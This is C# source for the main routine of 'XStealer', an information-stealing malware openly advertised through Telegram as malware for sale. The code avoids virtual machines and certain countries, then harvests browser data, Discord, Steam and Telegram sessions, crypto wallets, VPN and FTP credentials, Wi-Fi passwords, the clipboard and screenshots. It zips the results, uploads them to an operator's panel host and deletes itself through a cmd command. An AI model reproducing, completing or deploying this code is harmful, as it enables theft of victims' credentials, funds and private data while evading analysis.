// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer
{
    using System;
    using System.IO;
    using System.Threading;
    using System.Threading.Tasks;
    using Helpers;
    using Modules.Apps;
    using Modules.Apps.Discord;
    using Modules.Apps.Steam;
    using Modules.Apps.Vpn;
    using Modules.Apps.Wallets;
    using Modules.Browsers;
    using Modules.Browsers.Chromium;
    using Modules.Browsers.Gecko;
    using Modules.Machine;

    public static class XStealer_
    {
        [STAThread]
        public static void Main()
        {
            // Проверка на запуск дубликат-приложения
            using (new Mutex(true, $@"Local\{MutEx.ID}", out bool flag))
            {
                // Если запущена копия или запущена на виртуалке или RU странах, закрываем программу!
                if (!flag || Configurations.Act_Virtual_Machine && CheckVirtual.Inizialize || Configurations.Act_Country && CheckContry.Local) { return; }

                // Тут уже весь функционал работает
                Logger.Write($"~[XStealer INIZIALIZE]~");

                Logger.Write("Запуск задачи EngineTask");
                using var EngineTask = Task.Run(() =>
                {
                    CEngine.GetData();
                    GEngine.GetData();
                });

                BufferEx.Inizialize("Clip_BoardText.txt");
                Logger.Write("Запуск задачи MainFunction");
                using var MainFunction = Task.Run(() => // Запускаем новую задачу
                {
                    // Параллельно одновременно запускаем все методы (для быстрого прохода)
                    Parallel.Invoke(
                        () => InfoEx.Inizialize(),
                        () => ProcessInfo.Inizialize(),
                        () => SteamProfiles.GetSteamID(),
                        () => SteamFiles.Inizialize(),
                        () => PacketBrowsers.Inizialize(),
                        () => FilesCollector.Inizialize(),
                        () => Storage.GetData(),
                        () => FoxMail.Inizialize(),
                        () => DynDns.Inizialize(),
                        () => FileZilla.Inizialize(),
                        () => NordVpn.Inizialize(),
                        () => OpenVpn.Inizialize(),
                        () => Proton.Inizialize(),
                        () => UserAgents.Inizialize(),
                        () => Pidgin.Inizialize(),
                        () => ScreenShot.Inizialize(),
                        () => WifiEx.Inizialize(),
                        () => Telegram.GetInstalledData(),
                        () => Telegram.GetPortableData(),
                        () => CryptoWallets.GetInstalled(),
                        () => ExtensionWallets.Inizialize(),
                        () => RDPacket.Inizialize());
                });
                // Ожидаем завершения задач
                MainFunction.Wait();
                EngineTask.Wait();

                CounterEx.Inizialize("Counter.txt");

                Logger.Write("Проверка значения хоста...");
                if (!Configurations.Host.Contains("#HOST#")) // Проверяем что строка хоста не имеет "#HOST#"
                {
                    // Если хост установлен, запускаем задачу
                    Logger.Write("Запуск задачи EndFunction");
                    using var EndFunction = Task.Run(() =>
                    {
                        if (Configurations.ValidateZip(ZipEx.ZipListFiles())) // Проверка архива на корректность
                        {
                            WhiteRabbit.TransZipToPanel(Configurations.Host, GlobalPaths.ArchiveName, ZipEx.ZipListFiles()); // Отправка архива на панель
                        }
                    });         
                    EndFunction.Wait();
                }
                else
                {
                    Logger.Write("Сохранение архива на диске (функция для тестов)");
                    // Если хост не указан, сохраняем на диске
                    File.WriteAllBytes(GlobalPaths.ZipOut, ZipEx.ZipListFiles());
                }
                if (Configurations.Act_Self)
                {
                    Logger.Write("Завершение билд файла. (Само удаление)");
                    // Само удаление билд файла
                    ProcessEx.RunCmd($"/C choice /C Y /N /D Y /T 1 &Del {GlobalPaths.AssemblyPath}");
                    ProcessEx.RunCmd($"/C choice /C Y /N /D Y /T 0 &Del {GlobalPaths.GetFileName}");
                }
                else 
                {
                    Logger.Write("Завершение билд файла.");
                    Environment.Exit(0);
                } // Просто завершаем процесс
            }
        }
    }
}